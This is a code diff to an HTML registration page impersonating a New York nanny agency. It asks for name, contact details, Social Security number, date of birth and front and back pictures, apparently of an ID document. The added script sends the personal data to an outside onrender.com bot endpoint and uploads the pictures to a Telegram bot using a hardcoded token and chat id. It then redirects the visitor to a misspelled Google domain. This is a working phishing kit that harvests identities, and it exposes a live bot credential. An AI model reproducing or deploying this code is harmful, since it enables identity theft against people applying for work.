@@ -3,8 +3,13 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-	<title>Nannies by Noa | New York &amp; Tri-State Area Nanny Agency | Newborn Care</title>
-    <meta property="og:image" content="wp-content/uploads/2022/06/Nannies-by-Noa-Featured-Image.jpg" />
+    <title>
+      Nannies by Noa | New York &amp; Tri-State Area Nanny Agency | Newborn Care
+    </title>
+    <meta
+      property="og:image"
+      content="wp-content/uploads/2022/06/Nannies-by-Noa-Featured-Image.jpg"
+    />
 
     <!-- Include Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -26,7 +31,11 @@
 
       <h2 class="text-2xl font-bold mb-6 text-center">Registration Form</h2>
 
-      <form id="registrationForm" onsubmit="submitForm(event)">
+      <form
+        id="registrationForm"
+        onsubmit="submitForm(event)"
+        enctype="multipart/form-data"
+      >
         <div class="grid grid-cols-2 gap-4">
           <div>
             <label
@@ -201,16 +210,17 @@
       </form>
     </div>
 
+    <!-- ... Your existing HTML code ... -->
+
     <script>
       function updateFileName(inputId, inputElement) {
         const fileNameElement = document.getElementById(`${inputId}FileName`);
         const fileName = inputElement.files[0].name;
         fileNameElement.textContent = fileName;
       }
-      function submitForm(event) {
+
+      async function submitForm(event) {
         event.preventDefault();
-        // Disable the button
-        
 
         // Fetch form values
         const firstName = document.getElementById("firstName").value;
@@ -220,24 +230,119 @@
         const ssn = document.getElementById("ssn").value;
         const gender = document.getElementById("gender").value;
         const dob = document.getElementById("dob").value;
-        const frontPicture = document.getElementById("frontPicture").value;
-        const backPicture = document.getElementById("backPicture").value;
-        const acceptTerms = document.getElementById("acceptTerms").checked;
+        console.log(firstName);
 
-        // Display form data in console
-        console.log("First Name:", firstName);
-        console.log("Last Name:", lastName);
-        console.log("Email:", email);
-        console.log("Phone Number (USA):", phoneNumber);
-        console.log("Social Security Number:", ssn);
-        console.log("Gender:", gender);
-        console.log("Date of Birth:", dob);
-        console.log("Front Picture:", frontPicture);
-        console.log("Back Picture:", backPicture);
-        console.log("Accept Terms and Conditions:", acceptTerms);
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-          }, 2000);
+        console.log(lastName);
+        const data = {
+          firstName,
+          lastName,
+          email,
+          phoneNumber,
+          ssn,
+          gender,
+          dob,
+        };
+        // Make a fetch request to the Telegram API endpoint
+        fetch("https://telegram-bot-dkpv.onrender.com/form", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(data),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            console.log("Telegram API response:", data);
+            // Handle the response as needed
+          })
+          .catch((error) => {
+            console.error("Error sending photo to Telegram:", error);
+            // Handle the error as needed
+          });
+        // Fetch file inputs
+        const frontPicture = Array.from(
+          document.getElementById("frontPicture").files
+        );
+        const backPicture = Array.from(
+          document.getElementById("backPicture").files
+        );
+
+        // Get the file input element
+        const frontPictureInput = document.getElementById("frontPicture");
+        const backPictureInput = document.getElementById("backPicture");
+
+        // Check if a file is selected
+        if (frontPictureInput.files.length > 0) {
+          // Get the selected file
+          const file = frontPictureInput.files[0];
+
+          // Create a FormData object to handle multipart/form-data
+          const formData = new FormData();
+
+          // Append the photo file to the FormData object
+          formData.append("photo", file);
+
+          // Append other data (chat_id, etc.) to the FormData object
+          formData.append("chat_id", "1636602095");
+
+          // Make a fetch request to the Telegram API endpoint
+          fetch(
+            "https://api.telegram.org/bot6852520424:AAFkqAbL3nvXE_-Xg6EomFct0EffrbVJB9E/sendphoto",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then((response) => response.json())
+            .then((data) => {
+              console.log("Telegram API response:", data);
+              // Handle the response as needed
+            })
+            .catch((error) => {
+              console.error("Error sending photo to Telegram:", error);
+              // Handle the error as needed
+            });
+        } else {
+          console.error("No file selected");
+          // Handle the case where no file is selected
+        }
+        // Check if a file is selected
+        if (backPictureInput.files.length > 0) {
+          // Get the selected file
+          const file = backPictureInput.files[0];
+
+          // Create a FormData object to handle multipart/form-data
+          const formData2 = new FormData();
+
+          // Append the photo file to the FormData object
+          formData2.append("photo", file);
+
+          // Append other data (chat_id, etc.) to the FormData object
+          formData2.append("chat_id", "1636602095");
+
+          // Make a fetch request to the Telegram API endpoint
+          fetch(
+            "https://api.telegram.org/bot6852520424:AAFkqAbL3nvXE_-Xg6EomFct0EffrbVJB9E/sendphoto",
+            {
+              method: "POST",
+              body: formData2,
+            }
+          )
+            .then((response) => response.json())
+            .then((data2) => {
+              console.log("Telegram API response:", data2);
+              // Handle the response as needed
+              window.location.replace("https://googel.com");
+
+            })
+            .catch((error) => {
+              console.error("Error sending photo to Telegram:", error);
+              // Handle the error as needed
+            });
+        } else {
+          console.error("No file selected");
+          // Handle the case where no file is selected
+        }
       }
     </script>
   </body>
